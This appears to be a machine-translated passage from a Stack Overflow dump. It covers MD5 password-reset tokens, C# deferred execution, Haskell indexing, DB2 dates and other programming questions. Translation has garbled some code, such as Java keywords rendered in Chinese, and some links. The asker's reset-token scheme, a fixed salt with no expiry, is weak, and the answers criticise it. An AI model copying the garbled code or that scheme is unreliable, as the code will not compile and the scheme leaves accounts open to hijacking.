只是为了说明常量值背后的原因。这似乎很长，但如果`SqlCommandTimeout`以秒为单位，这是显示它是 10 分钟的好方法，而不是试图弄清楚 600 秒中有多少分钟。

# security - MD5 对于一次性身份验证仍然被认为是安全的吗？

> ID：13756697
> 
> 赞同：0
> 
> 时间：2012-12-07T03:59:52.370
> 
> 标签：security, md5, sha1

这些天来，每个人都在抨击 MD5 在存储密码方面的问题。但是，如果我只想为可能会使用一次的东西添加一层身份验证，那又如何呢？

这只是一个假设的例子，但假设我有一个允许用户重置密码的功能。我通过电子邮件向用户发送一个链接，他们可以单击该链接来设置新的（随机生成的）密码。

我目前的想法是，我将使用私有盐值和几个标识变量生成一个 MD5 哈希，并使用它来创建链接。

假设此功能的盐是“8b769a378411b705”（我对所有重置密码请求使用相同的盐）。其他识别数据是已经生成的密码散列的用户 ID 和数据库 ID。

```
salt = "8b769a378411b705" (private)
user_id = 123
pw_id = 456
code = md5(salt + " " + user_id + " " + pw_id) 
```

变成

```
code = "692a71cd7da194145be209e40fcd3e92" 
```

示例链接：**confirm_reset_password.php?user_id=123&pw_id=456&code=692a71cd7da194145be209e40fcd3e92**

鉴于 MD5 的问题，这被认为是安全的吗？我应该考虑使用另一种单向哈希，例如 SHA-1？

我一直在使用带有 SHA1 的 PBKDF2 来存储密码，我知道它的部分好处在于它的“慢”以及生成哈希需要多长时间。我可以为这样的目的生成那些更高质量的哈希，但我认为它会适得其反，因为你可以通过用（不正确的）请求轰炸服务器来轻松地让服务器瘫痪，因为每个请求都会导致大量的 CPU 工作产生哈希（特别是因为我使用了很多迭代）。似乎拥有“快速”算法对于单次使用目的是有好处的，但我想知道 MD5 是否仍然是最佳选择。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T07:09:55.670

首先，MD5 被认为是不安全的，原因有很多，首先，md5 的彩虹表现在非常庞大，可能覆盖了大部分哈希空间。其次，已知的攻击允许您创建哈希冲突（以产生相同 md5 输出的方式伪装其他数据）。第三，它的 128 位，今天它很短。

现在回到您的问题，如果您没有托管任何对安全至关重要的应用程序，您不存储任何私人数据、医疗数据或任何其他“国家法律控制”的数据，那么您就可以使用 md5。进入你的算法，它不是不安全的，但它也不是超级安全的，它是你的选择。您唯一应该添加的是新鲜度，即某种时间戳，告诉您消息的有效期。其次，您的算法不提供重放保护:)，如果用户将使用此链接一次并将其留在浏览器中，攻击者可能会再次使用此链接来重置此密码。这是一个相当严重的缺陷。所以你可能想要修复它。

但我想告诉你一些其他的事情。如果不是绝对必要，请勿使用 CRYPTO！我卑微的请求。您的密码重置方案可以在没有加密和重放保护的情况下轻松实施，并且安全性更高。您需要做的就是向您的表“pw_reset_hash”和“reset_validity”添加额外的列，并用随机数和有效日期填充它们。给用户一个随机数，用完后清空字段，事先检查有效性。瞧 :) 因为它是随机的，它可能比任何散列算法更安全。但是使用安全的 PRNG。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T09:00:19.880

为什么将密码链接建立在某些东西上？这只会使它的安全性降低（因为它基于一些可能泄漏的已知数据）！在这种情况下，随机生成的代码要好得多。

# c# - 为什么从 GET 操作中填充的唯一隐藏字段没有在模型中传递？

> ID：13756701
> 
> 赞同：1
> 
> 时间：2012-12-07T04:00:14.913
> 
> 标签：c#, asp.net-mvc-3, model

对不起，标题太长了，我不知道如何使它更短。

*   我的代码：

我的模型：

```
public class CarFilter {
    public String carMake { get; set; }
    public String carModel { get; set; }
    public String carEdition { get; set; }
    .
    .
    .
    public String SortBy { get; set; }
}

public class CarSearch : CarFilter {
    public List<Car> Car { get; set; }
} 
```

我的控制器：

```
public ActionResult SearchResult(CarSearch search)
    {
        var cars = from d in db.Cars
                   select d;

        if (Request.HttpMethod == "POST")
        {
            search.SortBy = "Price";
        }
        search.Car = new List<Car>();
        search.Car.AddRange(cars);

        var temp = new List<CarSearch>();
        temp.Add(search);

        return View(temp);
} 
```

我的索引视图（用户过滤结果的地方）：

```
@model IEnumerable<Cars.Models.CarSearch>
@using (Html.BeginForm("SearchResult", "Home", FormMethod.Post)){..forms and other stuff..} 
```

我的 SearchResult 视图（用户在其中看到过滤结果）：

```
@model IEnumerable<Cars.Models.CarSearch>
@using (Html.BeginForm("SearchResult", "Home", FormMethod.Get))
{
@Html.Hidden("carMake")
@Html.Hidden("carModel")
@Html.Hidden("carEdition")
.
.
.
@Html.Hidden("SortBy")

<input name="SortBy" class="buttons" type="submit" value="Make"/> 
```

*   我的目标

我想要做的是当用户点击排序时 Make 它必须将隐藏字段中的所有变量返回到 SearchResult 操作才能对结果进行排序（相同的过滤结果）。

*   结果

是：`<input id="SortBy" name="SortBy" type="hidden" value=""/>`。该值为 null 并且没有被传递，但所有其他隐藏字段（例如`carMake`等）都有值。但是当我使用它时，`foreach`它完美无缺。

*   问题

为什么会这样？SortBy 与视图中的其他字段位于同一模型类中。唯一的区别是 SortBy 没有在 Index 视图中填充其他字段，而是在控制器操作中填充。对此有何解释？我是否缺少任何 C# 定义或诸如动态对象之类的东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T04:47:12.397

您没有将任何 html 元素绑定到模型中的任何内容，您只是告诉它创建具有特定名称的隐藏字段。

而不是使用`@Html.Hidden("carMake")`try `@Html.HiddenFor(model => model.CarMake)`。

现在，您还需要以某种方式将搜索设置发送到视图。你在 ViewModel 上的继承让我有点失望。我认为没有太多理由`CarSearch`继承 from `CarFilter`。搜索真的是过滤器吗*？*让 Action`SearchResult`接收 a`CarFilter`并返回 a可能更清楚`CarSearch`，其中`CarSearch`可能是：

```
public class CarSearch 
{
    public CarFilter Filter { get; set; }
    public List<Car> Cars { get; set; }
} 
```

动作看起来像：

```
public ActionResult SearchResult(CarFilter filter)
{
    ...
    return View(new CarSearch {Filter = filter, Cars = <your result>});
} 
```

这样一来，您的操作就更清楚什么是输入和什么是输出。使用该模型，您的隐藏字段将类似于：

```
@Html.HiddenFor(model => model.Filter.CarMake) 
```

对于代表搜索结果的实际汽车，您可以`foreach`使用 .，部分视图或显示模板`@Html.DisplayFor()`。我可能会选择最后一个。

**注意**：我更改了属性的大小写，因为您可能希望遵守 C# 命名约定。

# c - 从内部 for 循环中断外部 for 循环的干净方法

> ID：13756706
> 
> 赞同：1
> 
> 时间：2012-12-07T04:00:41.840
> 
> 标签：c, nested-loops

假设您有一个双重嵌套的 for，例如当您试图查看一个未排序数组中的项目是否在另一个未排序数组中时。例如，假设您有 2 个列表`candidates`，并且`corruptPeople`您正在浏览`candidates`并跳过 中列出的列表`corruptPeople`。

```
for( int i = 0 ; i < lenCandidates ; i++ )
{
    // veto candidates[i] if candidates[i] is in corruptPeople at all
    for( int j = 0 ; j < lenCorruptPeople ; j++ )
        if( candidates[i] == corruptPeople[j] )
             break_this_loop_and_then_continue_outer_loop ;

    // initiate the eligible candidates
    initiate( candidates[i] ) ;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T04:02:49.407

一种方法（我愿意接受同行评审！）是使用`goto`：

```
for( int i = 0 ; i < lenCandidates ; i++ )
{
    // veto candidates[i] if candidates[i] is in corruptPeople at all
    for( int j = 0 ; j < lenCorruptPeople ; j++ )
        if( candidates[i] == corruptPeople[j] )
             goto END_FOR ;

    // initiate the eligible candidates
    initiate( candidates[i] ) ;

    END_FOR:
    ; // seem to need an empty statement to make it compile
} 
```

我很好奇其他人对`goto`在这种情况下的使用有什么看法。教条式的分歧`goto`意味着你将有一个教条式的结构化编程应用程序。当我尝试它时看起来很糟糕。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T04:08:35.850

使用附加变量比使用 goto 更好：

```
for( int i = 0 ; i < lenCandidates ; i++ )
{
    // veto candidates[i] if candidates[i] is in corruptPeople at all
    int corrupt = 0;
    for( int j = 0 ; j < lenCorruptPeople ; j++ )
        if( candidates[i] == corruptPeople[j] )
        {
            corrupt = 1;
            break;
        }

    // initiate the eligible candidates
    if (!corrupt) initiate( candidates[i] ) ;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T04:13:02.223

下面的代码怎么样？我错过了什么吗？

```
for( int i = 0 ; i < lenCandidates ; i++ )
{
    // veto candidates[i] if candidates[i] is in corruptPeople at all
    int j;
    for( j = 0 ; j < lenCorruptPeople ; j++ )
    {
        if( candidates[i] == corruptPeople[j] )
          break;
    }

    //j will be equal to lenCorruptPeople only when candidate is not in corrupt list   
    if(j==lenCorruptPeople)
    {
        initiate( candidates[i] ) ;
    }

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-07T04:43:24.837

将内部循环移动到另一个函数通常有助于：

```
typedef int Person; // or whatever it is.

Person *findPerson(Person *first, Person *last, Person val)
{
    while (first != last)
    {
        if (val == *first) return first;
        ++first;
    }
    return 0;
}

...

for( int i = 0 ; i < lenCandidates ; i++ )
{
    // veto candidates[i] if candidates[i] is in corruptPeople at all
    if (!findPerson(corruptPeople, corruptPeople+lenCorruptPeople, candidates[i]))
    {
        // initiate the eligible candidates
        initiate( candidates[i] ) ;
    }
} 
```

# qt - 如何在 Qt 中制作一个类似于 Skype 的 GUI，但联系人项目会下降

> ID：13756707
> 
> 赞同：-3
> 
> 时间：2012-12-07T04:00:42.053
> 
> 标签：qt, skype

我试图制作一个类似Skype的GUI，但没有成功。我想要的是使 Skype 联系人列表中的联系人列表相同。当您单击该列表中的某个联系人时，我们会注意到出现了一个小框，联系人向下移动，就像在 treewidget 中一样。

我已经尝试过 Qtreewidget、listwidget（带有 setitemWidget 功能）但没有什么好处。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T22:19:24.870

查看 Qt 文档中的这些类，QStandardItemModel、QStandardItem、QTreeView 和 QStyledItemDelegate

# javascript - 按数字顺序对本地存储键进行排序

> ID：13756708
> 
> 赞同：1
> 
> 时间：2012-12-07T04:00:45.023
> 
> 标签：javascript, html, local-storage

我有一个功能可以获取本地存储的所有密钥并通过电子邮件将其发送给您：

```
function sendLocalStorageByEmail(recipient) {
// create localstorage string
var output = "";

for (var key in localStorage) {
    output += key + "\n";
    output += localStorage[key] + "\n";
    output += "\n";
}

// create temporary anchor to emulate mailto click in new tab
var anchor = document.createElement("a");
anchor.href = "mailto:" + recipient + "?subject=Names for tonight&body=" + encodeURIComponent(output);
anchor.style.display = "none";
anchor.setAttribute("target", "_blank");
anchor.appendChild(document.createTextNode(""));
document.body.appendChild(anchor);

if (anchor.click) {
    return anchor.click();
} 
```

由于键是一个四位数字，我想先按数字顺序对它们进行排序。我的问题是，由于本地存储数据存储为字符串，并且大多数排序都是通过数组完成的。我是否必须将其转换为数组，然后再返回？

如果有人可以帮助我，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:32:15.400

```
function sendLocalStorageByEmail(recipient) {
    var output = '',
        arr = [],
        anchor = document.createElement("a");

    for (key in localStorage) {
        if (localStorage.hasOwnProperty(key) && !isNaN(key)) {
            arr.push(key);
        }
    }

    arr.sort(function(a, b) {
        return a.toLowerCase().localeCompare(b.toLowerCase());
    });

    for (var i=0; i<arr.length; i++) {
        output += arr[i] + "\n" + localStorage[arr[i]] + "\n\n";
    }

    anchor.href = "mailto:" + recipient + "?subject=Names for tonight&body=" + encodeURIComponent(output);
    anchor.style.display = "none";
    anchor.setAttribute("target", "_blank");
    anchor.appendChild(document.createTextNode(""));
    document.body.appendChild(anchor);

    if (anchor.click) {
        return anchor.click();
    }
}​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T04:08:10.480

也许你可以这样尝试：-

```
var output = [];

for (var key in localStorage) {
    output.push(localStorage[key]);
}
output.sort();
var result=output.join();
var len = result.length;
var formatresult;
for (var i=0; i<len; i++) {
formatresult+= result[i]+ "\n";
} 
```

# php - 如何通过帐户信息中提供的 URL 搜索 Twitter 用户？

> ID：13756711
> 
> 赞同：0
> 
> 时间：2012-12-07T04:01:00.983
> 
> 标签：php, python, twitter

[http://i.imgur.com/DvarE.png](http://i.imgur.com/DvarE.png)

我有很多网址，例如：[http ://www.aspli.com](http://www.aspli.com)

所有的 url 都在 twitter 的帐户信息中说明，就像屏幕截图中显示的一样。

如何获取帐户的用户名？

非常感谢。

# android-actionbar - Gmail Android 应用，例如 ActionView/Spinner (NAVIGATION_MODE_LIST)

> ID：13756713
> 
> 赞同：2
> 
> 时间：2012-12-07T04:01:14.727
> 
> 标签：android-actionbar, actionbarsherlock

我正在尝试像 gmail Android 应用程序一样实现 NAVIGATION_MODE_LIST。我的主要问题是从微调器列表中隐藏当前选定的项目。因此，例如，如此处所示，![gmail 安卓应用](../Images/caab2e9bdc05539b32c40fef61add572.png)如果您选择已发送，那么它只会在微调器中显示其他元素。

我的理解说它是一个自定义的 ActionView，而不是使用带有自定义适配器的 NAVIGATION_MODE_LIST。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T22:18:19.683

如果其他人正在寻找解决此问题的方法，那就是，

这是在[链接的帮助下编写的示例代码](https://stackoverflow.com/questions/11410028/android-custom-adapter-with-custom-spinner-drop-down-xml-layout-giving-error)

使用以下代码创建您的适配器并将其加入 ActionBar 列表导航

```
ActionBar actionBar = getSupportActionBar();
    actionBar.setNavigationMode(ActionBar.NAVIGATION_MODE_LIST);

    itemArr = getResources().getStringArray(R.array.array_spinner_items);
    items = toArrayList(itemArr, null);

    navigationAdapter = new CustomAdapter(this, R.layout.navigation_item_layout, items);
    actionBar.setListNavigationCallbacks(navigationAdapter, this);
    actionBar.setDisplayShowTitleEnabled(false); 
```

扩展`BaseAdapter`或`ArrayAdapter`和`implement SpinnerAdapter`

在您的适配器中覆盖 getDropdownView ，它负责下拉列表中的单个项目视图，并覆盖 getView ，它负责出现在 ActionBar 中的视图

`公共类 CustomAdapter 扩展 ArrayAdapter 实现 SpinnerAdapter {

```
 Context context;
    int textViewResourceId;
    ArrayList<String> arrayList;

    public CustomAdapter(Context context, int textViewResourceId,  ArrayList<String> arrayList) {
        super(context, textViewResourceId, arrayList);

        this.context = context;
        this.textViewResourceId = textViewResourceId;
        this.arrayList = arrayList;

    }

    @Override
     public View getDropDownView(int position, View convertView, ViewGroup parent){
       if (convertView == null)
       {
         LayoutInflater vi = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
         //convertView = vi.inflate(android.R.layout.simple_spinner_dropdown_item, null);
         convertView = vi.inflate(R.layout.navigation_item_layout, null);
       }

       TextView textView = (TextView) convertView.findViewById(R.id.navigation_item);
       textView.setText(arrayList.get(position).toString());//after changing from ArrayList<String> to ArrayList<Object>

       if (position  == curitem) { 
          textView.setHeight(0);
      }
      else{
        textView.setHeight(60);
      }

       return convertView;
     }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        if(convertView == null) {
            convertView = getLayoutInflater().inflate(R.layout.navigation_item_layout, null);
        }
        TextView textview = (TextView) convertView.findViewById(R.id.navigation_item);
        textview.setText(itemArr[position].toUpperCase());
        textview.setTextColor(Color.RED);
        return convertView;
    }

}` 
```

这是微调器项 navigation_tem_layout.xml 的布局文件

```
<?xml version="1.0" encoding="utf-8"?>
<TextView  xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/navigation_item" 
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:gravity="center_vertical"
    android:padding="10dp" /> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-24T18:20:21.477

您可能无法在导航列表中提供当前条目，而只是在 getView() 方法中的自定义 SpinnerAdapter 中显示它。

我刚刚写了一篇包含完整源代码的帖子，但我的示例使用静态类型数组 - 您可以将其更改为使用自定义 NavigationListItem 类（或任何您想要调用的类）并为每个活动构建一个动态列表，这样就不会包括当前的。您需要小心，因为微调器会在启动时尝试选择第一个条目，但您可以在 getView() 中显示您想要的内容，而不是使用 position 提供的条目。

[dandar3.blogspot.com/2013/03/actionbarsherlock-custom-list-navigation.html](http://dandar3.blogspot.com/2013/03/actionbarsherlock-custom-list-navigation.html)

# actionscript-3 - Starling 和 cameraroll 上传类型强制

> ID：13756716
> 
> 赞同：0
> 
> 时间：2012-12-07T04:01:42.227
> 
> 标签：actionscript-3, air, starling-framework

我正在尝试
[使用 Flex Mobile 4.6 在 iOS 上实现 cameraUI 上传库或捕获的图像](https://stackoverflow.com/questions/8913974/upload-library-or-captured-images-on-ios-with-flex-mobile-4-6)

在我的八哥项目中，允许用户选择图像并上传到服务器，但出现错误：

```
Error #1034: Type coercion failed: cannot convert starling.events::Event@752c0d1 to flash.events.Event 
```

看起来是罪魁祸首：

```
private function imageSelected( event:MediaEvent ):void
    {
        trace( "Media selected..." );   

        var imagePromise:MediaPromise = event.data;
        dataSource = imagePromise.open();    
        if( imagePromise.isAsync )
        {
            trace("Asynchronous media promise.");
            var eventSource:IEventDispatcher = dataSource as IEventDispatcher;            
            eventSource.addEventListener(starling.events.Event.COMPLETE, onMediaLoaded);         
        } else {
            trace( "Synchronous media promise." );
            readMediaData();
        }
    } 
```

我正在使用 Starling 来利用 Feathers UI。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-18T09:32:39.633

您是否同时导入了快闪活动和八哥活动？确保将八哥事件传递给 onMediaLoaded 函数。所以：

```
function onMediaLoaded(event:starling.events.Event){
   //do stuff
} 
```

不是：

```
function onMediaLoaded(event:Event){
   //do stuff
} 
```

# .net - 使用 TPL 进行文件下载调度程序并处理每个文件

> ID：13756717
> 
> 赞同：1
> 
> 时间：2012-12-07T04:01:49.457
> 
> 标签：.net, task-parallel-library

我目前的项目正在使用 .net 2.0 线程，并且有一个用于调度 1.File 下载线程和 2.File Processing Thread 的主线程。我可以限制并行处理的最大线程数，例如 16 个（可能是 10 个文件下载和 6 个已下载文件的文件处理）。我想使用 TPL 迁移我的代码。

```
Thread workerThread = null;
switch (Status)
{
    case StatusEnum.FileWatchLocked:
        workerThread = new Thread(workflowMgr.GetFiles);
        break;
    case FPFStatusEnum.ProcessLocked:
        workerThread = new Thread(workflowMgr.ProcessFiles);
        break;
}
lock (_threadCountMonitor)
{
    _workFlowPool.Add(workerThread, workflowMgr);
    _workFlowThreadIDPool.Add(workerThread.ManagedThreadId, workerThread);
    workerThread.Start();
    ++_threadCount;
} 
```

我需要跟踪某项任务是否已完成，并且我可以安排更多工作。我还需要为 getfile 和 processfile 实现 TPL。TPL 的最佳方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T04:53:13.617

我认为您的代码可以如下编写。通过这种方式，您无需手动将工作项排队。

```
foreach (var uri in uris)
{
    string filename = "urixxx"; //get local file name
    Task.Factory.StartNew(() =>
    {
        DownloadFile(uri, filename); 
    }).ContinueWith((t) =>
            {
                ProcessFile(filename);
            });
} 
```

# activiti - 如何从服务任务访问字段（扩展）值

> ID：13756720
> 
> 赞同：1
> 
> 时间：2012-12-07T04:02:00.417
> 
> 标签：activiti

我正在尝试创建一个正在使用`JavaDelegate`任务的流程。我必须将一些额外的静态值传递给任务实例（如邮件模板名称）。我试图通过`field`扩展传递它，但我无法从任务类访问它。

如何`field`从`JavaDelegate`任务中访问值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T09:00:58.463

该`fields`扩展仅支持`Java Class`task ，不支持`Delegate Expression`.

参考[文档](http://activiti.org/userguide/index.html#serviceTaskFieldInjection)。

# c# - 传递 Func 时方法未正确调用 作为论据

> ID：13756723
> 
> 赞同：3
> 
> 时间：2012-12-07T04:02:31.420
> 
> 标签：c#, exception-handling, ado.net, extension-methods, deferred-execution

从昨天开始，我一直在尝试使这种方法起作用，并开始拔头发-

基本上，我有一个从数据库中检索文章的方法。下面是方法代码：

```
public static IEnumerable<Article> RetrieveTopTenArticles()
{
    using(var dbConn = new SqlConnection(Settings.Instance.DbConnectionString))
    {
        const String query = "SELECT TOP 10 Title, Content FROM Article";
        Func<SqlDataReader, Article> operation = reader => reader.ToArticle();
        return dbConn.SqlRetrieveMultiple(query, operation);
    }
} 
```

在一个单独的“扩展”类中 -

```
public static IEnumerable<T> SqlRetrieveMultiple<T>(this SqlConnection sqlConnection, String query, Func<SqlDataReader, T> operation, params SqlParameter[] parameters)
{
    sqlConnection.Open();
    using (var command = new SqlCommand(query, sqlConnection))
    {
        if (parameters.Length > 0)
        {
            command.Parameters.AddRange(parameters);
        }
        using (SqlDataReader reader = command.ExecuteReader())
        {
            while (reader.Read())
            {
                yield return operation.Invoke(reader);
            }
        }
    }
} 
```

如您所见，我有一个扩展方法，它执行 SQL 选择语句，并迭代结果，调用操作并将每个 SqlDataReader 行转换为我的文章类型（也使用扩展方法完成）。我相信我过去使用过这种完全相同的扩展方法，没有任何问题。

当我调试它并到达 dbConn.SqlRetrieveMultiple(query, operation); 行，如果我按 F11 进入，它会完全跨过该行。它继续沿着结束嵌套括号链走，最终我在 sqlConnection.Open() 上得到一个异常。

我得到的例外是：

> ConnectionString 属性尚未初始化。

我发现如果我删除我的 Func 委托，该功能将正常运行。我觉得这必须是一些愚蠢的/与扩展方法或 SqlConnection 无关的东西，因为如果我将它放在同一个类中的常规私有静态方法中，我会得到相同的行为。如果我在 sqlConnection.Open(); 处打开 .NET 框架源单步执行；行，它跳转到 .NET 框架的 ctor 方法……如果需要，我可以发布更多代码，但我认为我已经拥有了一切必要的东西。如果您有任何想法，请告诉我。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-07T04:08:22.953

您正在返回迭代器方法的结果，而不是枚举它。[迭代器方法使用延迟执行](http://msdn.microsoft.com/en-us/library/bb669162.aspx)。结果，直到它要使用的连接被释放之后，它才真正做任何事情。这就是为什么它“只是跳过”该方法以及为什么它在以后的某个任意时间失败的原因。

您可以通过两种方式解决此问题。要么提前获取所有结果并返回它们，在处理发生之前急切地获取项目，使用类似 ToArray 的方法：

```
return dbConn.SqlRetrieveMultiple(query, operation).ToArray(); 
```

或者您可以通过将外部方法也设为迭代器方法来确保将处理延迟到延迟检索项目之后：

```
using(var dbConn = new SqlConnection(Settings.Instance.DbConnectionString))
{
    const String query = "SELECT TOP 10 Title, Content FROM Article";
    Func<SqlDataReader, Article> operation = reader => reader.ToArticle();
    foreach (var e in dbConn.SqlRetrieveMultiple(query, operation))
        yield return e;
} 
```

但是，请记住，如果用户重复这个惰性版本两次，他们最终会打开两个连接。这可能是也可能不是你想要的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T04:04:34.300

给出的异常意味着您的连接字符串有问题。发表它。

* * *

我也会这样使用你的函数：

```
while (reader.Read())
{
    yield return operation(reader);
} 
```

# haskell - Haskell选择第k个元素

> ID：13756724
> 
> 赞同：-5
> 
> 时间：2012-12-07T04:02:43.337
> 
> 标签：haskell

想从列表中选择第k个元素，可以这样调用函数

```
selectN 5 aList 
```

和我的功能

```
selectN :: Int -> a -> a
selectN 1 (x:_) = x
selectN [] _     = error "Index out of bounds"
selectN k (_:xs) 
  | n < 1           = error "Index out of bounds"
  | otherwise       = selectN xs (n - 1) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T04:39:51.230

好的，所以你的代码有一些问题，所以首先，让我们来看看这些问题：

```
selectN :: Int -> a -> a --You take in a list of a ie [a] and return a. So this is bit off
selectN 1 (x:_) = x 
selectN [] _     = error "Index out of bounds" -- Fine but not strictly needed
selectN k (_:xs) 
  | n < 1           = error "Index out of bounds" 
  | otherwise       = selectN xs (n - 1) --You've got the params backwards here. 
```

所以要解决这个问题，首先是一个好的类型签名：

```
selectN :: Int -> [a] -> a 
```

现在基本情况：

```
selectN 1 (x:_) = x --I would suggest using 0 not 1\. 
                    --Most things in Haskell are 0 based.
selectN n (x:xs) = selectN (n-1) xs 
```

这样就可以了，没有有用的错误消息，但是您可以弄清楚如何将它们重新添加。

这也很容易做到这一点，`(!!)`其类型签名为

```
(!!) :: [a]->Int->a 
```

所以

```
selectN = flip (!!) 
```

看看[hoogle](http://www.haskell.org/hoogle)它对这类事情很有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-08T03:26:36.460

要选择列表的第 k 个元素，只需使用`!!`. 第一个元素是索引`0`

```
selectN = (!!)

ghci> let test = "abracadabra"
ghci> test !! 0   
ghci> 'a'
ghci> test !! 9
ghci> 'r' 
```

但要小心`indexOutOfRange`异常

```
ghci> test !! 11 
*** Exception: Prelude.(!!): index too large 
```

**版本：使功能安全**

可以编写一个`safeSelectN`来处理错误异常并允许程序安全地继续运行而无需任何`IO`操作。为此，需要进行以下修改

```
safeSelectN :: Int -> [a] -> [a]
safeSelectN n xs = if null xs || length xs < n then [] else [xs !! n] 
```

在这种情况下，将通过接收一个空列表作为结果来检测错误。

```
ghci> safeSelectN 3 ""
[]
ghci> safeSelectN 0 ""
[]
ghci> safeSelectN 3 "abcd" --like this
['d'] 
```

因此，当结果正确时，您将不会只得到第 k 个元素，而是得到一个仅包含第 k 个元素的列表。

# antivirus - 在 Netapp Filer 上启用 vscan

> ID：13756727
> 
> 赞同：0
> 
> 时间：2012-12-07T04:02:55.490
> 
> 标签：antivirus, antivirus-integration, netapp

我想在我的**Netapp Filers 上启用****vscan**。我有 2 个文件管理器处理不同类型的用户数据。我目前在基于 Windows 的机器上使用**Sophos Endpoint Security v10并通过****Sophos Enterprise Console v4.7**进行管理。我可以在我的 netapp 文件管理器上将 Sophos Server 注册为 vscan 服务器吗？如果不是，其他可能性是什么？

 ******* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T06:42:34.820

简短的回答是，“是的”。您需要知道的一切都在启动指南中 - 可从概览页面获得。 [http://www.sophos.com/en-us/support/knowledgebase/12148.aspx](http://www.sophos.com/en-us/support/knowledgebase/12148.aspx)

一些警告......如果您运行 w2008 或更高版本，您将不得不降低一些安全限制。确保您的文件管理器使用的 DNS 服务器可以解析您的 vscan 服务器的 FQDN 的 IP。******

# sql - IBM DB2 SQL | 从 YEAR 和 WEEK NUMBER 获取周日和周一日期

> ID：13756729
> 
> 赞同：2
> 
> 时间：2012-12-07T04:03:07.813
> 
> 标签：sql, date, db2, week-number

在 IBM DB2 中，仅使用 SQL，我想使用 YEAR 和 WEEK NUMBER 来获取 Sunday Date 和 Monday Date。

我是 IBM DB2 的新手。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T04:35:00.700

假设**`n_year`**是年份，并且**`n_week_in_year`**是当年的 ISO 周数，我使用了以下函数：

```
 (DATE(((n_week_in_year-1)* 7)+ 1) + (n_year -1) years) 
```

我得到了那一周的星期一日期。

我的回答是基于阅读以下文章： [CodeNaut：计算一年中任何一周的日期](http://codenaut.blogspot.com.au/2009/01/calculate-date-for-given-week-in-year.html)

# javascript - 数组出错“对象不是函数”

> ID：13756733
> 
> 赞同：0
> 
> 时间：2012-12-07T04:04:00.453
> 
> 标签：javascript, ajax

我对 JavaScript 和 AJAX 相当陌生，但我正在尝试获取 AJAX 请求的响应文本并将其拆分为一个数组（响应文本以逗号分隔）。这是我得到的错误：

`Uncaught TypeError: object is not a function localhost:36 myrequest.onreadystatechange`

这是我的代码：

```
var currentpicid;
var currentcat;
var currentindex;
myrequest.onreadystatechange=function(){
    if (myrequest.readyState==4 && myrequest.status==200){ //request successful
        var infoarray = myrequest.responseText.split(',');
        currentpicid = infoarray(0);
        currentcat = "top";
        currentindex = index;

        document.getElementById("image").innerHTML=myrequest.responseText;
    }
} 
```

谁能帮我？我已经验证我的 PHP 页面只是输出一个逗号分隔的值列表。谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-07T04:06:00.027

代替：

```
currentpicid = infoarray(0); 
```

你需要：

```
currentpicid = infoarray[0]; 
```

括号用于函数调用。对数组索引使用方括号。

# python - 如何在其他网站为客户填写表格数据？

> ID：13756740
> 
> 赞同：0
> 
> 时间：2012-12-07T04:04:37.427
> 
> 标签：python, google-app-engine, cookies, client, jsessionid

也许这是不可能完成的任务……但我们开始吧：

我有一个网站 aaa.com，客户填写一些网络表格，然后我的应用程序将生成一些数据......下一步是将这些数据（即通过 POST）发送到 bbb.com......之后我应该发送bbb.com 的客户。在 bbb.com 中，客户将完成他的工作（即提交生成的数据）。

关于 bbb.com：他们正在使用 jsessionid(cookie)。

我正在使用 GAE（谷歌应用引擎，python）。

我怎样才能做到这一点？我需要一些提示！

# macos - 在命令行上针对 OS X 中的 DocBook 模式进行验证

> ID：13756744
> 
> 赞同：0
> 
> 时间：2012-12-07T04:05:28.017
> 
> 标签：macos, xsd, docbook

从命令行根据 DocBook 5 模式验证 XML 文件的最简单方法是什么？

特别是，我谈论的是 DocBook 文档，这些文档被拆分为多个文件并包含在`<xi:include href="..."/>`.

[这里的特定用例是在OpenStack 文档](http://github.com/openstack/openstack-manuals)中的提议更改中发现模式违规。

[如果我在oXygen](http://www.oxygenxml.com/) GUI 编辑器中打开文件，它将识别模式违规，但我希望能够从命令行运行这些检查。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-08T00:30:42.573

这听起来几乎像一个技巧问题：如果您想从命令行验证文档，您将需要使用命令行界面为您想到的模式语言获取模式验证器，不是吗？所以我猜你是在问哪些验证器有命令行界面？

一些 XSD 验证器具有命令行界面；按字母顺序，我首先想到的是： [MSV](http://msv.java.net/)（多模式验证器）、Saxon [-EE](http://www.saxonica.com)、[Xerces C](http://xerces.apache.org/xerces-c/)和[Xerces J。](http://xerces.apache.org/xerces-j/)xmllint （libxml 的命令行接口）和[xsv](http://www.xmlsoft.org/)中也有部分 XSD[实现](http://www.ltg.ed.ac.uk/~ht/xsv-status.html)。我相信也可以从命令行运行至少一个 Microsoft 的 XSD 实现，但正如您在标题中提到的 OS X 一样，我认为这不是您想要去的地方。

RelaxNG 验证器包括 Jing、xmllint 和 msv；都有命令行界面。

* * *

## 回答 #2

